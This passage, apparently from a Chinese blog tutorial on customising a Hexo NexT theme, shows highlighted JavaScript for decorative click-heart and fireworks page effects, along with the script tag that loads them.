class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!(<span class=\"keyword\">function</span> (<span class=\"params\">e, t, a</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">n</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"title function_\">c</span>(</span><br><span class=\"line\">      <span class=\"string\">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span></span><br><span class=\"line\">    ),</span><br><span class=\"line\">      <span class=\"title function_\">o</span>(),</span><br><span class=\"line\">      <span class=\"title function_\">r</span>()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">r</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> e = <span class=\"number\">0</span>; e &lt; d.<span class=\"property\">length</span>; e++)</span><br><span class=\"line\">      d[e].<span class=\"property\">alpha</span> &lt;= <span class=\"number\">0</span></span><br><span class=\"line\">        ? (t.<span class=\"property\">body</span>.<span class=\"title function_\">removeChild</span>(d[e].<span class=\"property\">el</span>), d.<span class=\"title function_\">splice</span>(e, <span class=\"number\">1</span>))</span><br><span class=\"line\">        : (d[e].<span class=\"property\">y</span>--,</span><br><span class=\"line\">          (d[e].<span class=\"property\">scale</span> += <span class=\"number\">0.004</span>),</span><br><span class=\"line\">          (d[e].<span class=\"property\">alpha</span> -= <span class=\"number\">0.013</span>),</span><br><span class=\"line\">          (d[e].<span class=\"property\">el</span>.<span class=\"property\">style</span>.<span class=\"property\">cssText</span> =</span><br><span class=\"line\">            <span class=\"string\">&#x27;left:&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">x</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;px;top:&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">y</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;px;opacity:&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">alpha</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;;transform:scale(&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">scale</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;,&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">scale</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;) rotate(45deg);background:&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">color</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;;z-index:99999&#x27;</span>))</span><br><span class=\"line\">    <span class=\"title function_\">requestAnimationFrame</span>(r)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">o</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> t = <span class=\"string\">&#x27;function&#x27;</span> == <span class=\"keyword\">typeof</span> e.<span class=\"property\">onclick</span> &amp;&amp; e.<span class=\"property\">onclick</span></span><br><span class=\"line\">    e.<span class=\"property\">onclick</span> = <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">      t &amp;&amp; <span class=\"title function_\">t</span>(), <span class=\"title function_\">i</span>(e)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">i</span>(<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = t.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>)</span><br><span class=\"line\">    ;(a.<span class=\"property\">className</span> = <span class=\"string\">&#x27;heart&#x27;</span>),</span><br><span class=\"line\">      d.<span class=\"title function_\">push</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">el</span>: a,</span><br><span class=\"line\">        <span class=\"attr\">x</span>: e.<span class=\"property\">clientX</span> - <span class=\"number\">5</span>,</span><br><span class=\"line\">        <span class=\"attr\">y</span>: e.<span class=\"property\">clientY</span> - <span class=\"number\">5</span>,</span><br><span class=\"line\">        <span class=\"attr\">scale</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">        <span class=\"attr\">alpha</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">        <span class=\"attr\">color</span>: <span class=\"title function_\">s</span>(),</span><br><span class=\"line\">      &#125;),</span><br><span class=\"line\">      t.<span class=\"property\">body</span>.<span class=\"title function_\">appendChild</span>(a)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">c</span>(<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = t.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;style&#x27;</span>)</span><br><span class=\"line\">    a.<span class=\"property\">type</span> = <span class=\"string\">&#x27;text/css&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      a.<span class=\"title function_\">appendChild</span>(t.<span class=\"title function_\">createTextNode</span>(e))</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (t) &#123;</span><br><span class=\"line\">      a.<span class=\"property\">styleSheet</span>.<span class=\"property\">cssText</span> = e</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    t.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&#x27;head&#x27;</span>)[<span class=\"number\">0</span>].<span class=\"title function_\">appendChild</span>(a)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">s</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"string\">&#x27;rgb(&#x27;</span> +</span><br><span class=\"line\">      ~~(<span class=\"number\">255</span> * <span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>()) +</span><br><span class=\"line\">      <span class=\"string\">&#x27;,&#x27;</span> +</span><br><span class=\"line\">      ~~(<span class=\"number\">255</span> * <span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>()) +</span><br><span class=\"line\">      <span class=\"string\">&#x27;,&#x27;</span> +</span><br><span class=\"line\">      ~~(<span class=\"number\">255</span> * <span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>()) +</span><br><span class=\"line\">      <span class=\"string\">&#x27;)&#x27;</span></span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> d = []</span><br><span class=\"line\">  ;(e.<span class=\"property\">requestAnimationFrame</span> = (<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      e.<span class=\"property\">requestAnimationFrame</span> ||</span><br><span class=\"line\">      e.<span class=\"property\">webkitRequestAnimationFrame</span> ||</span><br><span class=\"line\">      e.<span class=\"property\">mozRequestAnimationFrame</span> ||</span><br><span class=\"line\">      e.<span class=\"property\">oRequestAnimationFrame</span> ||</span><br><span class=\"line\">      e.<span class=\"property\">msRequestAnimationFrame</span> ||</span><br><span class=\"line\">      <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(e, <span class=\"number\">1e3</span> / <span class=\"number\">60</span>)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;)()),</span><br><span class=\"line\">    <span class=\"title function_\">n</span>()</span><br><span class=\"line\">&#125;)(<span class=\"variable language_\">window</span>, <span class=\"variable language_\">document</span>)</span><br></pre></td></tr></table></figure></li>\n<li>在 <code>themes/next/layout/_layout.swig</code> 文件末尾添加：<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 页面点击小红心 --&gt;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;/js/clicklove.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li>烟火特效<ul>\n<li>在 <code>themes/next/source/js/</code> 里面建一个叫 <code>fireworks.js</code> 的文件，复制代码如下：<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&quot;use strict&quot;</span>;<span class=\"keyword\">function</span> <span class=\"title function_\">updateCoords</span>(<span class=\"params\">e</span>)&#123;pointerX=(e.<span class=\"property\">clientX</span>||e.<span class=\"property\">touches</span>[<span class=\"number\">0</span>].<span class=\"property\">clientX</span>)-canvasEl.<span class=\"title function_\">getBoundingClientRect</span>().<span class=\"property\">left</span>,pointerY=e.<span class=\"property\">clientY</span>||e.<span class=\"property\">touches</span>[<span class=\"number\">0</span>].<span class=\"property\">clientY</span>-canvasEl.<span class=\"title function_\">getBoundingClientRect</span>().<span class=\"property\">top</span>&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">setParticuleDirection</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">var</span> t=anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,<span class=\"number\">360</span>)*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>/<span class=\"number\">180</span>,a=anime.<span class=\"title function_\">random</span>(<span class=\"number\">50</span>,<span class=\"number\">180</span>),n=[-<span class=\"number\">1</span>,<span class=\"number\">1</span>][anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>)]*a;<span class=\"keyword\">return</span>&#123;<span class=\"attr\">x</span>:e.<span class=\"property\">x</span>+n*<span class=\"title class_\">Math</span>.<span class=\"title function_\">cos</span>(t),<span class=\"attr\">y</span>:e.<span class=\"property\">y</span>+n*<span class=\"title class_\">Math</span>.<span class=\"title function_\">sin</span>(t)&#125;&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">createParticule</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a=&#123;&#125;;<span class=\"keyword\">return</span> a.<span class=\"property\">x</span>=e,a.<span class=\"property\">y</span>=t,a.<span class=\"property\">color</span>=colors[anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,colors.<span class=\"property\">length</span>-<span class=\"number\">1</span>)],a.<span class=\"property\">radius</span>=anime.<span class=\"title function_\">random</span>(<span class=\"number\">16</span>,<span class=\"number\">32</span>),a.<span class=\"property\">endPos</span>=<span class=\"title function_\">setParticuleDirection</span>(a),a.<span class=\"property\">draw</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"title function_\">beginPath</span>(),ctx.<span class=\"title function_\">arc</span>(a.<span class=\"property\">x</span>,a.<span class=\"property\">y</span>,a.<span class=\"property\">radius</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>,!<span class=\"number\">0</span>),ctx.<span class=\"property\">fillStyle</span>=a.<span class=\"property\">color</span>,ctx.<span class=\"title function_\">fill</span>()&#125;,a&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">createCircle</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a=&#123;&#125;;<span class=\"keyword\">return</span> a.<span class=\"property\">x</span>=e,a.<span class=\"property\">y</span>=t,a.<span class=\"property\">color</span>=<span class=\"string\">&quot;#F00&quot;</span>,a.<span class=\"property\">radius</span>=<span class=\"number\">0.1</span>,a.<span class=\"property\">alpha</span>=<span class=\"number\">0.5</span>,a.<span class=\"property\">lineWidth</span>=<span class=\"number\">6</span>,a.<span class=\"property\">draw</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"property\">globalAlpha</span>=a.<span class=\"property\">alpha</span>,ctx.<span class=\"title function_\">beginPath</span>(),ctx.<span class=\"title function_\">arc</span>(a.<span class=\"property\">x</span>,a.<span class=\"property\">y</span>,a.<span class=\"property\">radius</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>,!<span class=\"number\">0</span>),ctx.<span class=\"property\">lineWidth</span>=a.<span class=\"property\">lineWidth</span>,ctx.<span class=\"property\">strokeStyle</span>=a.<span class=\"property\">color</span>,ctx.<span class=\"title function_\">stroke</span>(),ctx.<span class=\"property\">globalAlpha</span>=<span class=\"number\">1</span>&#125;,a&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">renderParticule</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> t=<span class=\"number\">0</span>;t&lt;e.<span class=\"property\">animatables</span>.<span class=\"property\">length</span>;t++)&#123;e.<span class=\"property\">animatables</span>[t].<span class=\"property\">target</span>.<span class=\"title function_\">draw</span>()&#125;&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">animateParticules</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> a=<span class=\"title function_\">createCircle</span>(e,t),n=[],i=<span class=\"number\">0</span>;i&lt;numberOfParticules;i++)&#123;n.<span class=\"title function_\">push</span>(<span class=\"title function_\">createParticule</span>(e,t))&#125;anime.<span class=\"title function_\">timeline</span>().<span class=\"title function_\">add</span>(&#123;<span class=\"attr\">targets</span>:n,<span class=\"attr\">x</span>:<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">return</span> e.<span class=\"property\">endPos</span>.<span class=\"property\">x</span>&#125;,<span class=\"attr\">y</span>:<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">return</span> e.<span class=\"property\">endPos</span>.<span class=\"property\">y</span>&#125;,<span class=\"attr\">radius</span>:<span class=\"number\">0.1</span>,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">1200</span>,<span class=\"number\">1800</span>),<span class=\"attr\">easing</span>:<span class=\"string\">&quot;easeOutExpo&quot;</span>,<span class=\"attr\">update</span>:renderParticule&#125;).<span class=\"title function_\">add</span>(&#123;<span class=\"attr\">targets</span>:a,<span class=\"attr\">radius</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">80</span>,<span class=\"number\">160</span>),<span class=\"attr\">lineWidth</span>:<span class=\"number\">0</span>,<span class=\"attr\">alpha</span>:&#123;<span class=\"attr\">value</span>:<span class=\"number\">0</span>,<span class=\"attr\">easing</span>:<span class=\"string\">&quot;linear&quot;</span>,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">600</span>,<span class=\"number\">800</span>)&#125;,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">1200</span>,<span class=\"number\">1800</span>),<span class=\"attr\">easing</span>:<span class=\"string\">&quot;easeOutExpo&quot;</span>,<span class=\"attr\">update</span>:renderParticule,<span class=\"attr\">offset</span>:<span class=\"number\">0</span>&#125;)&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">debounce</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a;<span class=\"keyword\">return</span> <span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;<span class=\"keyword\">var</span> n=<span class=\"variable language_\">this</span>,i=<span class=\"variable language_\">arguments</span>;<span class=\"built_in\">clearTimeout</span>(a),a=<span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;e.<span class=\"title function_\">apply</span>(n,i)&#125;,t)&#125;&#125;<span class=\"keyword\">var</span> canvasEl=<span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&quot;.fireworks&quot;</span>);<span class=\"keyword\">if</span>(canvasEl)&#123;<span class=\"keyword\">var</span> ctx=canvasEl.<span class=\"title function_\">getContext</span>(<span class=\"string\">&quot;2d&quot;</span>),numberOfParticules=<span class=\"number\">30</span>,pointerX=<span class=\"number\">0</span>,pointerY=<span class=\"number\">0</span>,tap=<span class=\"string\">&quot;mousedown&quot;</span>,colors=[<span class=\"string\">&quot;#FF1461&quot;</span>,<span class=\"string\">&quot;#18FF92&quot;</span>,<span class=\"string\">&quot;#5A87FF&quot;</span>,<span class=\"string\">&quot;#FBF38C&quot;</span>],setCanvasSize=<span class=\"title function_\">debounce</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;canvasEl.<span class=\"property\">width</span>=<span class=\"number\">2</span>*<span class=\"variable language_\">window</span>.<span class=\"property\">innerWidth</span>,canvasEl.<span class=\"property\">height</span>=<span class=\"number\">2</span>*<span class=\"variable language_\">window</span>.<span class=\"property\">innerHeight</span>,canvasEl.<span class=\"property\">style</span>.<span class=\"property\">width</span>=<span class=\"variable language_\">window</span>.<span class=\"property\">innerWidth</span>+<span class=\"string\">&quot;px&quot;</span>,canvasEl.<span class=\"property\">style</span>.<span class=\"property\">height</span>=<span class=\"variable language_\">window</span>.<span class=\"property\">innerHeight</span>+<span class=\"string\">&quot;px&quot;</span>,canvasEl.<span class=\"title function_\">getContext</span>(<span class=\"string\">&quot;2d&quot;</span>).<span class=\"title function_\">scale</span>(<span class=\"number\">2</span>,<span class=\"number\">2</span>)&#125;,<span class=\"number\">500</span>),render=<span class=\"title function_\">anime</span>(&#123;<span class=\"attr\">duration</span>:<span class=\"number\">1</span>/<span class=\"number\">0</span>,<span class=\"attr\">update</span>:<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"title function_\">clearRect</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>,canvasEl.<span class=\"property\">width</span>,canvasEl.<span class=\"property\">height</span>)&#125;&#125;);<span class=\"variable language_\">document</span>.<span class=\"title function_\">addEventListener</span>(tap,<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"string\">&quot;sidebar&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">id</span>&amp;&amp;<span class=\"string\">&quot;toggle-sidebar&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">id</span>&amp;&amp;<span class=\"string\">&quot;A&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">nodeName</span>&amp;&amp;<span class=\"string\">&quot;IMG&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">nodeName</span>&amp;&amp;(render.<span class=\"title function_\">play</span>(),<span class=\"title function_\">updateCoords</span>(e),<span class=\"title function_\">animateParticules</span>(pointerX,pointerY))&#125;,!<span class=\"number\">1</span>),<span class=\"title function_\">setCanvasSize</span>(),<span class=\"variable language_\">window</span>.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;resize&quot;</span>,setCanvasSize,!<span class=\"number\">1</span>)&#125;<span class=\"string\">&quot;use strict&quot;</span>;<span class=\"keyword\">function</span> <span class=\"title function_\">updateCoords</span>(<span class=\"params\">e</span>)&#123;pointerX=(e.<span class=\"property\">clientX</span>||e.<span class=\"property\">touches</span>[<span class=\"number\">0</span>].<span class=\"property\">clientX</span>)-canvasEl.<span class=\"title function_\">getBoundingClientRect</span>().<span class=\"property\">left</span>,pointerY=e.<span class=\"property\">clientY</span>||e.<span class=\"property\">touches</span>[<span class=\"number\">0</span>].<span class=\"property\">clientY</span>-canvasEl.<span class=\"title function_\">getBoundingClientRect</span>().<span class=\"property\">top</span>&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">setParticuleDirection</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">var</span> t=anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,<span class=\"number\">360</span>)*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>/<span class=\"number\">180</span>,a=anime.<span class=\"title function_\">random</span>(<span class=\"number\">50</span>,<span class=\"number\">180</span>),n=[-<span class=\"number\">1</span>,<span class=\"number\">1</span>][anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>)]*a;<span class=\"keyword\">return</span>&#123;<span class=\"attr\">x</span>:e.<span class=\"property\">x</span>+n*<span class=\"title class_\">Math</span>.<span class=\"title function_\">cos</span>(t),<span class=\"attr\">y</span>:e.<span class=\"property\">y</span>+n*<span class=\"title class_\">Math</span>.<span class=\"title function_\">sin</span>(t)&#125;&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">createParticule</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a=&#123;&#125;;<span class=\"keyword\">return</span> a.<span class=\"property\">x</span>=e,a.<span class=\"property\">y</span>=t,a.<span class=\"property\">color</span>=colors[anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,colors.<span class=\"property\">length</span>-<span class=\"number\">1</span>)],a.<span class=\"property\">radius</span>=anime.<span class=\"title function_\">random</span>(<span class=\"number\">16</span>,<span class=\"number\">32</span>),a.<span class=\"property\">endPos</span>=<span class=\"title function_\">setParticuleDirection</span>(a),a.<span class=\"property\">draw</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"title function_\">beginPath</span>(),ctx.<span class=\"title function_\">arc</span>(a.<span class=\"property\">x</span>,a.<span class=\"property\">y</span>,a.<span class=\"property\">radius</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>,!<span class=\"number\">0</span>),ctx.<span class=\"property\">fillStyle</span>=a.<span class=\"property\">color</span>,ctx.<span class=\"title function_\">fill</span>()&#125;,a&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">createCircle</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a=&#123;&#125;;<span class=\"keyword\">return</span> a.<span class=\"property\">x</span>=e,a.<span class=\"property\">y</span>=t,a.<span class=\"property\">color</span>=<span class=\"string\">&quot;#F00&quot;</span>,a.<span class=\"property\">radius</span>=<span class=\"number\">0.1</span>,a.<span class=\"property\">alpha</span>=<span class=\"number\">0.5</span>,a.<span class=\"property\">lineWidth</span>=<span class=\"number\">6</span>,a.<span class=\"property\">draw</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"property\">globalAlpha</span>=a.<span class=\"property\">alpha</span>,ctx.<span class=\"title function_\">beginPath</span>(),ctx.<span class=\"title function_\">arc</span>(a.<span class=\"property\">x</span>,a.<span class=\"property\">y</span>,a.<span class=\"property\">radius</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>,!<span class=\"number\">0</span>),ctx.<span class=\"property\">lineWidth</span>=a.<span class=\"property\">lineWidth</span>,ctx.<span class=\"property\">strokeStyle</span>=a.<span class=\"property\">color</span>,ctx.<span class=\"title function_\">stroke</span>(),ctx.<span class=\"property\">globalAlpha</span>=<span class=\"number\">1</span>&#125;,a&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">renderParticule</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> t=<span class=\"number\">0</span>;t&lt;e.<span class=\"property\">animatables</span>.<span class=\"property\">length</span>;t++)&#123;e.<span class=\"property\">animatables</span>[t].<span class=\"property\">target</span>.<span class=\"title function_\">draw</span>()&#125;&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">animateParticules</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> a=<span class=\"title function_\">createCircle</span>(e,t),n=[],i=<span class=\"number\">0</span>;i&lt;numberOfParticules;i++)&#123;n.<span class=\"title function_\">push</span>(<span class=\"title function_\">createParticule</span>(e,t))&#125;anime.<span class=\"title function_\">timeline</span>().<span class=\"title function_\">add</span>(&#123;<span class=\"attr\">targets</span>:n,<span class=\"attr\">x</span>:<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">return</span> e.<span class=\"property\">endPos</span>.<span class=\"property\">x</span>&#125;,<span class=\"attr\">y</span>:<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">return</span> e.<span class=\"property\">endPos</span>.<span class=\"property\">y</span>&#125;,<span class=\"attr\">radius</span>:<span class=\"number\">0.1</span>,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">1200</span>,<span class=\"number\">1800</span>),<span class=\"attr\">easing</span>:<span class=\"string\">&quot;easeOutExpo&quot;</span>,<span class=\"attr\">update</span>:renderParticule&#125;).<span class=\"title function_\">add</span>(&#123;<span class=\"attr\">targets</span>:a,<span class=\"attr\">radius</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">80</span>,<span class=\"number\">160</span>),<span class=\"attr\">lineWidth</span>:<span class=\"number\">0</span>,<span class=\"attr\">alpha</span>:&#123;<span class=\"attr\">value</span>:<span class=\"number\">0</span>,<span class=\"attr\">easing</span>:<span class=\"string\">&quot;linear&quot;</span>,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">600</span>,<span class=\"number\">800</span>)&#125;,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">1200</span>,<span class=\"number\">1800</span>),<span class=\"attr\">easing</span>:<span class=\"string\">&quot;easeOutExpo&quot;</span>,<span class=\"attr\">update</span>:renderParticule,<span class=\"attr\">offset</span>:<span class=\"number\">0</span>&#125;)&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">debounce</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a;<span class=\"keyword\">return</span> <span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;<span class=\"keyword\">var</span> n=<span class=\"variable language_\">this</span>,i=<span class=\"variable language_\">arguments</span>;<span class=\"built_in\">clearTimeout</span>(a),a=<span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;e.<span class=\"title function_\">apply</span>(n,i)&#125;,t)&#125;&#125;<span class=\"keyword\">var</span> canvasEl=<span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&quot;.fireworks&quot;</span>);<span class=\"keyword\">if</span>(canvasEl)&#123;<span class=\"keyword\">var</span> ctx=canvasEl.<span class=\"title function_\">getContext</span>(<span class=\"string\">&quot;2d&quot;</span>),numberOfParticules=<span class=\"number\">30</span>,pointerX=<span class=\"number\">0</span>,pointerY=<span class=\"number\">0</span>,tap=<span class=\"string\">&quot;mousedown&quot;</span>,colors=[<span class=\"string\">&quot;#FF1461&quot;</span>,<span class=\"string\">&quot;#18FF92&quot;</span>,<span class=\"string\">&quot;#5A87FF&quot;</span>,<span 